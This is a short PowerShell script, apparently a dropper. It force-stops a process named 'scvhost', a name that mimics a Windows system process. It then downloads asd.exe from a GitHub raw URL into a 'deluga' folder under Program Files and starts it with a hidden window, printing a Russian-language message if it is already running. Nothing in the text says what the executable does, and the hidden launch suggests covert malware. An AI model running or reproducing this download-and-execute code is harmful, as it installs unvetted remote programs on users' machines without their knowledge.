Get-Process -Name "scvhost" -ErrorAction SilentlyContinue | Stop-Process -Force;
$url="https://raw.githubusercontent.com/requiemmmmmmm/reqq/main/asd.exe";
$path="${env:ProgramFiles}\deluga";
if(!(Test-Path $path)){ New-Item -ItemType Directory -Path $path -Force | Out-Null };
$file="$path\asd.exe";
if(!(Test-Path $file)){ (New-Object System.Net.WebClient).DownloadFile($url,$file) };
$alreadyRunning = Get-Process -Name "asd" -ErrorAction SilentlyContinue;
if (-not $alreadyRunning) {
    Start-Process -FilePath $file -WindowStyle Hidden
} else {
    Write-Host "asd.exe уже запущен, пропускаю"
}